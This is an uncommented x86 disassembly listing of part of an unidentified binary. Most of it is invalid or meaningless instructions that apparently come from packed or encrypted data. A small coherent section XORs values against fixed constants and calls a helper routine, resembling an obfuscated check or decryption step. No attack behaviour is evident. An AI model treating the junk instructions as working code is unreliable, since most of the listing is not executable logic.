  406daf:	dec    edi
  406db0:	out    0xc8,eax
  406db2:	xor    dl,BYTE PTR [ebp+0x4d]
  406db5:	hlt    
  406db6:	mov    edx,0x77e337c0
  406dbb:	les    esp,FWORD PTR [ebx]
  406dbd:	dec    esp
  406dbe:	cmp    al,0x56
  406dc0:	pop    ds
  406dc1:	pop    esi
  406dc2:	mov    WORD PTR [edi-0x7f],es
  406dc5:	cmp    al,0x5c
  406dc7:	and    ebx,DWORD PTR [edi+0x387cbb0b]
  406dcd:	adc    DWORD PTR [edi-0x1],edx
  406dd0:	jl     0x406d78
  406dd2:	lock mov edx,0xc0c1e765
  406dd8:	call   0x42e80063
  406ddd:	popa   
  406dde:	arpl   cx,si
  406de0:	fbld   TBYTE PTR [ebx-0x34]
  406de3:	int3   
  406de4:	push   ebp
  406de5:	pop    ds
  406de6:	mov    bl,0x5f
  406de8:	loopne 0x406e4e
  406dea:	sbb    esi,DWORD PTR [ebp-0x11]
  406ded:	sub    ah,BYTE PTR [edx]
  406def:	pop    es
  406df0:	ja     0x406e5d
  406df2:	dec    edx
  406df3:	xchg   edx,eax
  406df4:	or     esp,edi
  406df6:	cmp    ch,dh
  406df8:	jp     0x406e0e
  406dfa:	(bad)  
  406dfb:	les    edi,FWORD PTR [ebx-0x7b]
  406dfe:	mov    DWORD PTR [esi],esi
  406e00:	ins    DWORD PTR es:[edi],dx
  406e01:	into   
  406e02:	test   DWORD PTR [ecx],edi
  406e04:	sub    BYTE PTR [ecx-0x4dab3e22],0x3d
  406e0b:	in     al,0x50
  406e0d:	rcr    DWORD PTR [ebx+0x62f33d51],1
  406e13:	sbb    BYTE PTR [edi],bh
  406e15:	mov    esi,0xcabc7963
  406e1a:	leave  
  406e1b:	ins    BYTE PTR es:[edi],dx
  406e1c:	int    0xb7
  406e1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406e1f:	xor    cl,BYTE PTR [esp+eax*1-0xc7b9cf1]
  406e26:	and    dh,al
  406e28:	out    dx,al
  406e29:	stos   BYTE PTR es:[edi],al
  406e2a:	dec    ecx
  406e2b:	icebp  
  406e2c:	stos   DWORD PTR es:[edi],eax
  406e2d:	mov    eax,0x114260e1
  406e32:	jb     0x406e44
  406e34:	ja     0x406e5f
  406e36:	xchg   ebp,eax
  406e37:	dec    ebx
  406e38:	imul   ebp,DWORD PTR [ebp-0x789a92fe],0x3f6df71
  406e42:	jae    0x406e86
  406e44:	aam    0x60
  406e46:	mov    al,0x4f
  406e48:	sub    ebx,edi
  406e4a:	inc    ebp
  406e4b:	outs   dx,BYTE PTR ds:[esi]
  406e4c:	scas   al,BYTE PTR es:[edi]
  406e4d:	mov    DWORD PTR [ebp+0x10],edx
  406e50:	mov    edx,DWORD PTR [esi+0x4]
  406e53:	xor    eax,0xcb79b576
  406e58:	mov    DWORD PTR [ebp+0x14],edx
  406e5b:	cmp    eax,DWORD PTR [ebp+0x10]
  406e5e:	jne    0x407653
  406e64:	mov    eax,edx
  406e66:	cmp    DWORD PTR [ebp+0xc],eax
  406e69:	jne    0x407653
  406e6f:	mov    eax,DWORD PTR [esi]
  406e71:	mov    edx,DWORD PTR [esi+0x4]
  406e74:	mov    eax,DWORD PTR [esi]
  406e76:	mov    edx,DWORD PTR [esi+0x4]
  406e79:	mov    edx,eax
  406e7b:	xor    eax,eax
  406e7d:	shl    edx,0x1e
  406e80:	mov    DWORD PTR [ebp+0x10],eax
  406e83:	mov    eax,DWORD PTR [esi]
  406e85:	xor    edx,0x80000000
  406e8b:	mov    DWORD PTR [ebp+0x14],edx
  406e8e:	mov    edx,DWORD PTR [esi+0x4]
  406e91:	xor    eax,0xcb79b577
  406e96:	xor    ecx,edx
  406e98:	shrd   eax,ecx,0x2
  406e9c:	or     eax,DWORD PTR [ebp+0x10]
  406e9f:	shr    ecx,0x2
  406ea2:	mov    DWORD PTR [ebp+0x8],eax
  406ea5:	mov    eax,ecx
  406ea7:	or     eax,DWORD PTR [ebp+0x14]
  406eaa:	mov    ecx,DWORD PTR [ebx]
  406eac:	mov    edx,DWORD PTR [ebx+0x4]
  406eaf:	push   eax
  406eb0:	push   DWORD PTR [ebp+0x8]
  406eb3:	push   edx
  406eb4:	push   ecx
  406eb5:	call   0x41594e
  406eba:	mov    eax,DWORD PTR [esi]
  406ebc:	mov    ecx,DWORD PTR [esi+0x4]
  406ebf:	shrd   eax,ecx,0x2
  406ec3:	shr    ecx,0x2
  406ec6:	shr    edx,0x1e
  406ec9:	xor    ecx,0xe70ae2ba
  406ecf:	push   ecx
  406ed0:	xor    eax,edi
  406ed2:	mov    DWORD PTR [ebp+0x10],edx
  406ed5:	mov    edx,DWORD PTR [ebx]
  406ed7:	mov    edi,DWORD PTR [ebx+0x4]
  406eda:	push   eax
  406edb:	push   edi
  406edc:	push   edx
  406edd:	call   0x41594e
  406ee2:	shld   edx,eax,0x2
  406ee6:	mov    ecx,edx
  406ee8:	xor    edx,edx
  406eea:	or     ecx,edx
  406eec:	mov    edx,DWORD PTR [esi]
  406eee:	mov    edi,DWORD PTR [esi+0x4]
  406ef1:	shl    eax,0x2
  406ef4:	or     eax,DWORD PTR [ebp+0x10]
  406ef7:	jmp    0x407298
  406efc:	test   al,0xc
  406efe:	lea    ebp,[esi]
  406f00:	mov    cl,0xbc
  406f02:	test   al,0x9c
  406f04:	sahf   
  406f05:	cld    
  406f06:	lds    esp,FWORD PTR [edx+edi*2-0x416f71c5]
  406f0d:	dec    ecx
  406f0e:	mov    esi,0xbec4bdbe
  406f13:	mov    esi,0xc20a7d68
  406f18:	test   DWORD PTR [eax+0x35c62ec6],0x845bd41b
  406f22:	es int 0x65
  406f25:	or     eax,0xa446354f
  406f2a:	rol    bh,cl
  406f2c:	xchg   edx,eax
  406f2d:	mov    cl,0xac
  406f2f:	scas   eax,DWORD PTR es:[edi]
  406f30:	or     al,ah
  406f32:	cmp    BYTE PTR [ebx+0x5d],bh
  406f35:	ret    
  406f36:	fwait
  406f37:	push   0xd0ea28be
  406f3c:	es or  al,0xa1
  406f3f:	bound  esp,QWORD PTR [edx-0x7a]
  406f42:	mov    ebx,0xa76a7625
  406f47:	sub    edi,DWORD PTR [edi]
  406f49:	xchg   edx,eax
  406f4a:	rcr    BYTE PTR [ebx+0x29ad7ed],cl
  406f50:	stos   DWORD PTR es:[edi],eax
  406f51:	inc    eax
  406f52:	push   ecx
  406f53:	xchg   ebx,eax
  406f54:	or     DWORD PTR [ecx-0x1f8c347b],ebx
  406f5a:	es jmp 0xbfaf:0x339bce73
  406f62:	mov    eax,0x516ab6b1
  406f67:	xchg   esi,eax
  406f68:	cmp    eax,0x81beab27
  406f6d:	pushf  
  406f6e:	push   esp
  406f6f:	adc    ecx,DWORD PTR [ebx]
  406f71:	adc    DWORD PTR [eax+0x1be39329],esi
  406f77:	les    eax,FWORD PTR [esp+eiz*4+0x45]
  406f7b:	aam    0xf
  406f7d:	outs   dx,BYTE PTR ds:[esi]
  406f7e:	jge    0x406fd5
  406f80:	pusha  
  406f81:	adc    al,0x2
  406f83:	mov    es,WORD PTR [esi]
  406f85:	test   DWORD PTR [eax+0x28134982],edi
  406f8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406f8c:	pop    ebx
  406f8d:	pop    edx
  406f8e:	mov    esi,0x633e64d9
  406f93:	sbb    DWORD PTR [edx+0x746ceb6c],edi
  406f99:	cmp    al,0xbc
  406f9b:	sbb    eax,0x7174242
  406fa0:	pushf  
  406fa1:	retf   0x54f7
  406fa4:	cli    
  406fa5:	mov    dh,0x50
  406fa7:	mov    ecx,0xc31faf4b
  406fac:	xor    DWORD PTR [ebx+0x67],ebx
  406faf:	inc    edx
  406fb0:	push   es
  406fb1:	ins    DWORD PTR es:[edi],dx
  406fb2:	jmp    0xa9bd039b
  406fb7:	lock push ebx
  406fb9:	sbb    eax,0xf6682ca9
  406fbe:	aaa    
  406fbf:	jecxz  0x406f64
  406fc1:	repz mov al,ds:0xc02b548a
  406fc7:	sbb    al,0x4a
  406fc9:	mov    al,0xda
  406fcb:	push   0xfffffff2
  406fcd:	sahf   
  406fce:	pop    esi
  406fcf:	fcomp  st(4)
  406fd1:	cmp    eax,0xd8152831
  406fd6:	inc    esp
  406fd7:	out    dx,eax
  406fd8:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  406fda:	adc    BYTE PTR [ecx-0x6826169d],dh
  406fe0:	mov    ds:0xbdbdf647,eax
  406fe5:	or     bh,BYTE PTR fs:[edi]
  406fe8:	add    BYTE PTR [edx-0x4a],0x78
  406fec:	popa   
  406fed:	fst    QWORD PTR [ebp+esi*1+0x1c]
  406ff1:	inc    eax
  406ff2:	inc    ebp
  406ff3:	push   cs
  406ff4:	sub    eax,0x8d2b6cb4
  406ff9:	push   ds
  406ffa:	fwait
  406ffb:	repnz push edx
  406ffd:	inc    esp
  406ffe:	je     0x407048
  407000:	sbb    eax,0x5a7d13ea
  407005:	leave  
  407006:	jl     0x407021
  407008:	sbb    eax,0xe370a6a2
  40700d:	jns    0x40708c
  40700f:	stc    
  407010:	cld    
  407011:	pop    esp
  407012:	(bad)  
  407013:	or     ebp,DWORD PTR [edx-0x70]
  407016:	sbb    BYTE PTR [si-0x3e],ah
  40701a:	out    0x4b,eax
  40701c:	or     BYTE PTR [eax],bh
  40701e:	cmp    BYTE PTR [eax+esi*2+0x42],cl
  407022:	(bad)  [ecx+0x7cac6c68]
  407028:	test   WORD PTR gs:0x23f48057,bp
  407030:	jns    0x406ffe
  407032:	jge    0x407011
  407034:	mov    al,ds:0xa0057c5d
  407039:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40703a:	sbb    dh,BYTE PTR cs:[esi+0x791d12b4]
  407041:	or     ecx,ecx
  407043:	jb     0x40701b
  407045:	(bad)  [edi+0xf]
  407048:	imul   ecx,DWORD PTR [ecx+0x18ef216],0x65
  40704f:	mov    ebp,DWORD PTR [ebx+ebp*1+0x56]
  407053:	out    dx,al
  407054:	lds    edx,FWORD PTR [eax-0x29415502]
  40705a:	cmp    eax,0x4ebbc384
  40705f:	cmc    
  407060:	jge    0x407092
  407062:	adc    dl,al
  407064:	push   0x61fa8029
  407069:	push   ebp
  40706a:	sub    DWORD PTR [eax-0x13],edi
  40706d:	sub    DWORD PTR [edx-0x23cdadd3],0x736986a0
  407077:	ss cwde 
  407079:	inc    esi
  40707a:	and    eax,0x6f70cae5
  40707f:	push   esp
  407080:	dec    ebp
  407081:	push   ebp
  407082:	push   ss
  407083:	mov    al,0xfe
  407085:	stc    
  407086:	mov    bh,0x8e
  407088:	push   esp
  407089:	xlat   BYTE PTR ds:[ebx]
  40708a:	push   edx
  40708b:	(bad)  
  40708c:	not    DWORD PTR [edi]
  40708e:	inc    esp
  40708f:	lods   eax,DWORD PTR ds:[esi]
  407090:	push   ebp
  407091:	and    edx,eax
  407093:	and    bh,BYTE PTR [ebp+0x28]
  407096:	and    DWORD PTR ss:[ebp-0x1c],ebp
  40709a:	fwait
  40709b:	sub    al,0xeb
  40709d:	scas   al,BYTE PTR es:[edi]
  40709e:	mov    dl,0xf5
  4070a0:	xor    bl,BYTE PTR [edx]
  4070a2:	jns    0x40705a
  4070a4:	dec    edx
  4070a5:	add    al,0x7a
  4070a7:	xchg   ebx,ebp
  4070a9:	mov    gs,WORD PTR [eax]
  4070ab:	call   0x8e2e:0xd4e83046
  4070b2:	pop    ebx
  4070b3:	(bad)  
  4070b4:	hlt    
  4070b5:	leave  
  4070b6:	xor    eax,0x57fd6f70
  4070bb:	je     0x407135
  4070bd:	ins    DWORD PTR es:[edi],dx
  4070be:	dec    edi
  4070bf:	mov    al,0x7e
  4070c1:	push   ebx
  4070c2:	repz arpl dx,ax
  4070c5:	(bad)  
  4070c6:	ror    BYTE PTR [edx-0x694192b2],cl
  4070cc:	retf   
  4070cd:	and    BYTE PTR [edi],dl
  4070cf:	xchg   ebp,eax
  4070d0:	cli    
  4070d1:	xchg   edx,eax
  4070d2:	cmc    
  4070d3:	jmp    0x75af:0xf442fae5
  4070da:	ds dec ecx
  4070dc:	scas   eax,DWORD PTR es:[edi]
  4070dd:	jecxz  0x4070a4
  4070df:	retf   
  4070e0:	adc    BYTE PTR [ebp-0x2d88286a],al
  4070e6:	stc    
  4070e7:	push   edx
  4070e8:	push   esp
  4070e9:	fld    st(2)
  4070eb:	cmp    al,0x46
  4070ed:	repnz push edx
  4070ef:	add    edx,ebp
  4070f1:	js     0x407163
  4070f3:	xchg   ah,bl
  4070f5:	and    eax,0x1375cfff
  4070fa:	pop    esi
  4070fb:	stos   DWORD PTR es:[edi],eax
  4070fc:	push   ss
  4070fd:	jp     0x407156
  4070ff:	inc    edi
  407100:	fbld   TBYTE PTR [edi+0x3b]
  407103:	or     BYTE PTR [ebx+0x61fc1894],al
  407109:	test   al,0x20
  40710b:	adc    esp,ebx
  40710d:	scas   al,BYTE PTR es:[edi]
  40710e:	and    cl,bl
  407110:	mov    ds:0xb66ae962,al
  407115:	bound  esi,QWORD PTR [edi]
  407117:	int3   
  407118:	mov    bl,0xbe
  40711a:	dec    eax
  40711b:	aam    0x5f
  40711d:	push   es
  40711e:	(bad)  
  40711f:	popa   
  407120:	(bad)  
  407122:	mov    ds:0xdd77dbea,al
  407127:	in     al,dx
  407128:	aam    0x20
  40712a:	xchg   edx,eax
  40712b:	arpl   dx,bx
  40712d:	jmp    0xc415:0xc74cec34
  407134:	ss mov dh,0x2d
  407137:	test   eax,0x1dc8c9c9
  40713c:	adc    ch,BYTE PTR [ebp+0x13e7551]
  407142:	sub    eax,DWORD PTR [edi-0x26fd605]
  407148:	pushf  
  407149:	mov    BYTE PTR [eax-0x45],ch
  40714c:	cmp    eax,0x9ccf23c7
  407151:	iret   
  407152:	(bad)
  407156:	xor    BYTE PTR [edi],dl
  407158:	int3   
  407159:	pop    ds
  40715a:	ror    BYTE PTR [ebx*8-0x6723a092],1
  407161:	cmp    BYTE PTR [edi+0x71],al
  407164:	stos   DWORD PTR es:[edi],eax
  407165:	jae    0x4071b2
  407167:	mov    DWORD PTR [ecx+0x469728d9],ebp
  40716d:	(bad)  
  40716e:	arpl   WORD PTR [ebx],cx
  407170:	and    eax,0x71b3ab93
  407175:	jp     0x407170
  407177:	push   0x52
  407179:	shl    DWORD PTR [esi],cl
  40717b:	pop    ebx
  40717c:	femms  
  40717e:	je     0x4071d7
  407180:	dec    BYTE PTR [ebx]
  407182:	stos   BYTE PTR es:[edi],al
  407183:	jmp    0x1991:0x1627bbd3
  40718a:	ss stos DWORD PTR es:[edi],eax
  40718c:	pop    ss
  40718d:	lea    ebx,[eax+0x0]
  407190:	xor    al,0x58
  407192:	jg     0x407203
  407194:	mov    BYTE PTR [ecx],dh
  407196:	mov    esp,0x93e6b73e
  40719b:	or     al,0x8d
  40719d:	mov    DWORD PTR [ebp+ebp*8+0x471bfab7],edi
  4071a4:	push   ebx
  4071a5:	in     eax,dx
  4071a6:	adc    BYTE PTR [ebp-0x3b],al
  4071a9:	pop    ecx
  4071aa:	rol    BYTE PTR ds:0x193c3544,1
  4071b0:	mov    dh,0x60
  4071b2:	adc    al,0x27
  4071b4:	and    eax,0xc78cb5e6
  4071b9:	mov    ch,0x31
  4071bb:	stc    
  4071bc:	hlt    
  4071bd:	sub    BYTE PTR [esi-0x5],0x1a
  4071c1:	xchg   ecx,eax
  4071c2:	push   esp
  4071c3:	mov    esp,0x9a2ef26f
  4071c8:	xlat   BYTE PTR ds:[ebx]
  4071c9:	add    DWORD PTR [eax-0x2fddc0ab],0x9338cc8e
  4071d3:	sbb    DWORD PTR [eax-0x6a7e1cf3],ebx
  4071d9:	inc    ebp
  4071da:	inc    edx
  4071db:	pop    edx
  4071dc:	fst    QWORD PTR [esp+esi*2-0x7b65f21e]
  4071e3:	or     DWORD PTR [eax+ecx*4+0xa],edx
  4071e7:	in     eax,0xb7
  4071e9:	imul   edi,DWORD PTR [edx-0x3b4f2ac3],0x4fb19653
  4071f3:	push   edx
  4071f4:	cmp    DWORD PTR [ebx],ebp
  4071f6:	aaa    
  4071f7:	or     al,0x2c
  4071f9:	call   0xe70cf04f
  4071fe:	test   BYTE PTR [eax+edi*4],0xf1
  407202:	sbb    eax,0xe507116a
  407207:	xor    dh,BYTE PTR [edx+0xf1b594a]
  40720d:	adc    ebp,edx
  40720f:	push   esi
  407210:	in     al,dx
  407211:	dec    edi
  407212:	outs   dx,BYTE PTR ds:[esi]
  407213:	jne    0x4071df
  407215:	outs   dx,BYTE PTR ds:[esi]
  407216:	and    bh,bl
  407218:	arpl   dx,dx
  40721a:	into   
  40721b:	jmp    0xdea7fd5d
  407220:	(bad)  
  407221:	xchg   esp,eax
  407222:	dec    ecx
  407223:	ins    DWORD PTR es:[edi],dx
  407224:	mov    ah,BYTE PTR [esi+0x45b262ae]
  40722a:	push   ds
  40722b:	mov    eax,ds:0xc7b2c6d3
  407230:	and    eax,0x49c8b3e9
  407235:	lds    ebx,FWORD PTR [esi+0x50]
  407238:	dec    edi
  407239:	outs   dx,DWORD PTR ds:[esi]
  40723a:	imul   ebp,DWORD PTR ds:0x6eb9f0e4,0x3b2f9938
  407244:	mov    ebx,0xd723a30f
  407249:	dec    edx
  40724a:	mov    ds:0x3bb10f47,al
  40724f:	outs   dx,DWORD PTR ds:[esi]
  407250:	cmp    edx,DWORD PTR [edx+0x8b0c959]
  407256:	jl     0x40725a
  407258:	jl     0x4072ca
  40725a:	popa   
  40725b:	lahf   
  40725c:	outs   dx,DWORD PTR ds:[esi]
  40725d:	in     al,dx
  40725e:	sbb    edi,esi
  407260:	mov    esp,0x4ff4f5df
  407265:	rcr    BYTE PTR [esi+0x2e0378fd],cl
  40726b:	and    eax,0x59efb97e
  407270:	dec    ebx
  407271:	outs   dx,DWORD PTR ds:[esi]
  407272:	adc    edi,DWORD PTR [eax+0x3af945f3]
  407278:	cmp    esi,DWORD PTR [esi+0x9f0ad6d]
  40727e:	sbb    BYTE PTR [ebp-0x24],cl
  407281:	mov    dl,BYTE PTR [ecx]
  407283:	mov    ebx,0xc028f8d0
  407288:	js     0x407217
  40728a:	adc    esp,DWORD PTR [eax]
  40728c:	xchg   ecx,eax
  40728d:	pop    ebx
  40728e:	stos   DWORD PTR es:[edi],eax
  40728f:	xchg   ebx,eax
  407290:	imul   edi,DWORD PTR [eax+0x6a],0xa2f9906e
  407297:	lea    esi,[ebx]
  407299:	stc    
  40729a:	xor    edx,eax
  40729c:	xor    edx,0xcb79b576
  4072a2:	xor    edi,0x9c2b8ae8
  4072a8:	mov    DWORD PTR [esi],edx
  4072aa:	jmp    0x40764b
  4072af:	mov    bl,0xe6
  4072b1:	ds lahf 
  4072b3:	pushf  
  4072b4:	test   al,0xb4
  4072b6:	stc    
  4072b7:	jo     0x4072e0
  4072b9:	inc    edx
  4072ba:	fucomp st(6)
  4072bc:	ret    
  4072bd:	outs   dx,BYTE PTR ds:[esi]
  4072be:	fnstsw WORD PTR [ebp-0x424141b1]
  4072c4:	les    edi,FWORD PTR [esi-0x7a20a942]
  4072ca:	mov    dl,BYTE PTR [esi]
  4072cc:	aad    0x5
  4072ce:	mov    ebp,0x295af246
  4072d3:	sub    al,0x5f
  4072d5:	outs   dx,BYTE PTR ds:[esi]
  4072d6:	enter  0x2c3a,0xb0
  4072da:	pusha  
  4072db:	adc    ah,BYTE PTR [edi+0x60984d9a]
  4072e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4072e2:	xor    dl,BYTE PTR [ebx+0x1e574579]
  4072e8:	icebp  
  4072e9:	sub    eax,0x10520e9
  4072ee:	ret    0x3575
  4072f1:	pop    esp
  4072f2:	sbb    al,0x4d
  4072f4:	lds    eax,FWORD PTR [edi-0x72]
  4072f7:	pop    edx
  4072f8:	test   DWORD PTR [edx+0x38],edi
  4072fb:	push   es
  4072fc:	cld    
  4072fd:	push   0xb6ffe3d9
  407302:	mov    ebp,0xeb91b0f3
  407307:	iret   
  407308:	dec    ebp
  407309:	outs   dx,BYTE PTR ds:[esi]
  40730a:	ror    DWORD PTR [esi+0x7195fbb7],0x99
  407311:	jmp    0x3497b8a9
  407316:	mov    bl,0xfe
  407318:	sub    DWORD PTR [ecx-0x7a4db059],esi
  40731e:	adc    BYTE PTR [edx+0x17ba7420],dh
  407324:	add    al,0xda
  407326:	bound  ebp,QWORD PTR [ecx]
  407328:	fwait
  407329:	test   DWORD PTR [esi],ecx
  40732b:	adc    eax,0x959a2847
  407330:	ret    
  407331:	cmc    
  407332:	popa   
  407333:	push   ds
  407334:	gs mov ah,dh
  407337:	inc    ebp
  407338:	retf   
  407339:	mov    dh,dl
  40733b:	in     eax,dx
  40733c:	mov    eax,0x7199aa08
  407341:	pop    esi
  407342:	cmp    BYTE PTR ds:0x7a7f7da0,bh
  407348:	addr16 loopne 0x40735f
  40734b:	cld    
  40734c:	repnz out 0x9b,eax
  40734f:	aam    0x61
  407351:	neg    ch
  407353:	pop    ecx
  407354:	outs   dx,DWORD PTR ds:[esi]
  407355:	loopne 0x40737e
  407357:	mov    ds:0x1bfb70d5,al
  40735c:	cmc    
  40735d:	adc    ecx,DWORD PTR [eax-0x2f]
  407360:	outs   dx,DWORD PTR ds:[esi]
  407361:	addr16 (bad) 
  407363:	adc    eax,0x34aff5d6
  407368:	xchg   DWORD PTR [esi],ecx
  40736a:	das    
  40736b:	push   0x410ad6fa
  407370:	dec    edi
  407371:	sbb    esi,edi
  407373:	adc    BYTE PTR [edi-0x5513123d],bh
  407379:	mov    cl,BYTE PTR [ebx-0x36]
  40737c:	jp     0x407348
  40737e:	fisubr DWORD PTR [edx-0x26]
  407381:	cmp    al,0xa1
  407383:	sub    DWORD PTR [ecx+0x38c6c45d],0x351bdf89
  40738d:	stos   BYTE PTR es:[edi],al
  40738e:	mov    edx,DWORD PTR [ebp+0x6a2cee4e]
  407394:	daa    
  407395:	or     esi,edx
  407397:	mov    esp,0xd1f2523f
  40739c:	in     al,dx
  40739d:	fldenv [eax+0x1909d302]
  4073a3:	popa   
  4073a4:	daa    
  4073a5:	in     eax,0xfb
  4073a7:	mov    al,0xd7
  4073a9:	cmp    cl,dh
  4073ab:	xor    DWORD PTR [edi],edx
  4073ad:	xor    dh,BYTE PTR [ebp+0xb495129]
  4073b3:	add    DWORD PTR [eax-0x754e6446],edx
  4073b9:	in     eax,dx
  4073ba:	sbb    DWORD PTR [ebx+0x2dd19cfe],eax
  4073c0:	adc    eax,0x6a9f3bd0
  4073c5:	loopne 0x40734f
  4073c7:	jbe    0x40741e
  4073c9:	cld    
  4073ca:	(bad)  
  4073cb:	and    edi,DWORD PTR [ebx-0xb]
  4073ce:	pop    eax
  4073cf:	pop    edi
  4073d0:	retf   0xd5cf
  4073d3:	outs   dx,BYTE PTR ds:[esi]
  4073d4:	xchg   esi,eax
  4073d5:	xor    al,0x41
  4073d7:	sbb    esi,0x8
  4073da:	mov    al,ds:0xd825aadb
  4073df:	lock mov bh,0x55
  4073e2:	dec    ebx
  4073e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4073e4:	add    al,0x95
  4073e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4073e7:	mov    eax,ds:0x10ff18d5
  4073ec:	bound  ebx,QWORD PTR [eax-0x1e]
  4073ef:	fsub   DWORD PTR [edi+edx*8]
  4073f2:	shl    DWORD PTR [eax-0x102ed37c],cl
  4073f8:	jnp    0x4073d0
  4073fa:	adc    BYTE PTR [edx+edx*2],0xea
  4073fe:	adc    DWORD PTR ds:0x86e9a705,esp
  407404:	add    BYTE PTR [ebp-0x6a],dh
  407407:	test   eax,0xe9eba8fa
  40740c:	push   0xfa339d63
  407411:	ins    BYTE PTR es:[edi],dx
  407412:	add    ebx,DWORD PTR [esi]
  407414:	push   ecx
  407415:	dec    eax
  407416:	and    edx,DWORD PTR [esp+esi*1+0x6c]
  40741a:	mov    edx,0x9057315b
  40741f:	js     0x407425
  407421:	retf   0x364
  407424:	pop    esp
  407425:	jb     0x407484
  407427:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407428:	and    DWORD PTR [eax+eiz*4+0x19],ecx
  40742c:	ss call 0xd3be991c
  407432:	leave  
  407433:	pop    esp
  407434:	das    
  407435:	test   BYTE PTR [edx-0x79a765ab],cl
  40743b:	inc    ebp
  40743c:	ficom  WORD PTR [esi+0x6fc3b9e3]
  407442:	fld    TBYTE PTR [eax+0x12]
  407445:	ins    BYTE PTR es:[edi],dx
  407446:	mov    eax,0x5acd3e55
  40744b:	xchg   edx,eax
  40744c:	and    DWORD PTR [edi+0x19daf005],ecx
  407452:	into   
  407453:	cld    
  407454:	imul   esi
  407456:	jae    0x407477
  407458:	dec    edi
  407459:	or     ecx,ebx
  40745b:	pop    edi
  40745c:	popf   
  40745d:	mov    esi,0x460aaf29
  407462:	xlat   BYTE PTR ds:[ebx]
  407463:	xchg   ecx,eax
  407464:	push   0x72
  407466:	rcr    DWORD PTR [edx],0xd8
  407469:	mov    cl,0x22
  40746b:	add    al,0x3e
  40746d:	fwait
  40746e:	int    0x50
  407470:	xchg   ebx,eax
  407471:	pop    eax
  407472:	dec    eax
  407473:	push   edx
  407474:	pop    ebx
  407475:	adc    eax,0x49163ab8
  40747a:	ficomp WORD PTR [esi+esi*2]
  40747d:	mov    dh,0xa0
  40747f:	cmp    dl,BYTE PTR [ebx+0x5eb43788]
  407485:	pop    ebx
  407486:	ss pusha 
  407488:	jge    0x40740d
  40748a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40748b:	inc    si
  40748d:	mov    dh,0xf2
  40748f:	fsub   st,st(3)
  407491:	out    0xf0,al
  407493:	popa   
  407494:	hlt    
  407495:	dec    edi
  407496:	mov    edi,0x7ea7fc7f
  40749b:	in     eax,0x54
  40749d:	es and eax,0x19cc7723
  4074a3:	test   eax,0x7e32e2a0
  4074a8:	push   eax
  4074a9:	(bad)  
  4074aa:	aam    0xd5
  4074ac:	enter  0x337f,0x2
  4074b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4074b1:	dec    esp
  4074b2:	xlat   BYTE PTR ds:[ebx]
  4074b3:	and    edi,DWORD PTR [ecx+ebp*1]
  4074b6:	mov    eax,0x80f1fd15
  4074bb:	xchg   ah,bl
  4074bd:	sbb    ch,bh
  4074bf:	sub    cl,BYTE PTR [edi+edi*8+0x10fc52ec]
  4074c6:	inc    eax
  4074c7:	mov    edi,0x2c6f42e7
  4074cc:	pop    ss
  4074cd:	pop    esp
  4074ce:	fdivr  DWORD PTR [edi]
  4074d0:	out    dx,eax
  4074d1:	shl    eax,0xa6
  4074d4:	shr    ebp,cl
  4074d6:	test   eax,0x60f31261
  4074db:	mov    edi,0xa09261ff
  4074e0:	adc    al,0x87
  4074e2:	outs   dx,BYTE PTR ds:[esi]
  4074e3:	jmp    0x5744b12f
  4074e8:	dec    ebx
  4074e9:	hlt    
  4074ea:	mul    BYTE PTR [esi-0x19b80b97]
  4074f0:	cmp    DWORD PTR [ebp-0x58d24389],edx
  4074f6:	push   es
  4074f7:	cmp    ch,BYTE PTR [edx+0x5f]
  4074fa:	mov    dl,0x14
  4074fc:	jo     0x4074ae
  4074fe:	xchg   esp,eax
  4074ff:	adc    DWORD PTR [ecx+0x75],eax
  407502:	nop
  407503:	push   ss
  407504:	mov    ch,0x85
  407506:	bound  ebp,QWORD PTR [ecx]
  407508:	dec    eax
  407509:	pop    ss
  40750a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40750b:	lods   eax,DWORD PTR ds:[esi]
  40750c:	mov    dl,0xe9
  40750e:	jne    0x407522
  407510:	push   ebp
  407511:	inc    edx
  407512:	xchg   ah,ch
  407514:	inc    eax
  407515:	lods   eax,DWORD PTR ds:[esi]
  407516:	push   ss
  407517:	push   ss
  407518:	mov    ah,bl
  40751a:	hlt    
  40751b:	and    bl,cl
  40751d:	nop
  40751e:	sbb    DWORD PTR [ebx+0x241c7679],ebp
  407524:	add    al,0x6c
  407526:	xor    eax,0xbdd7b8fb
  40752b:	je     0x40759a
  40752d:	shl    DWORD PTR [ebx],1
  40752f:	adc    ah,BYTE PTR [eax+0x5e]
  407532:	in     eax,0x42
  407534:	xor    DWORD PTR [ebx+edx*1],esp
  407537:	push   edx
  407538:	pop    ebp
  407539:	loope  0x40751f
  40753b:	fisubr DWORD PTR [ebx+0x1a]
  40753e:	mov    eax,0xe16fc3ab
  407543:	adc    DWORD PTR [ecx-0x369c525f],edx
  407549:	mov    ch,ah
  40754b:	test   ebx,0x887cc3ee
  407551:	inc    eax
  407552:	sbb    ah,BYTE PTR [esp+esi*4+0x75]
  407556:	ds xchg esi,eax
  407558:	aam    0x81
  40755a:	mov    edx,0xd1689c77
  40755f:	out    0xa4,al
  407561:	retf   
  407562:	out    0xee,eax
  407564:	mov    cx,0xab13
  407568:	push   esi
  407569:	outs   dx,BYTE PTR ds:[esi]
  40756a:	push   ss
  40756b:	jb     0x4074fb
  40756d:	inc    edi
  40756e:	sub    eax,0xeb3846f3
  407573:	cld    
  407574:	(bad)  
  407575:	(bad)  
  407576:	std    
  407577:	sbb    eax,0xad1e1c20
  40757c:	fidiv  DWORD PTR [ebp+ebx*8-0x72b527a2]
  407583:	cmp    al,BYTE PTR [ebx+eax*4]
  407586:	test   DWORD PTR [ecx+0xf],eax
  407589:	jbe    0x407530
  40758b:	cmc    
  40758c:	adc    eax,0xddbf1fd6
  407592:	shr    dh,cl
  407594:	ss test eax,0xd2ff73cd
  40759a:	push   edi
  40759b:	hlt    
  40759c:	add    al,0xc8
  40759e:	jno    0x407587
  4075a0:	les    ecx,FWORD PTR [edi*2+0x6e6dc62f]
  4075a7:	xor    dl,BYTE PTR [eax]
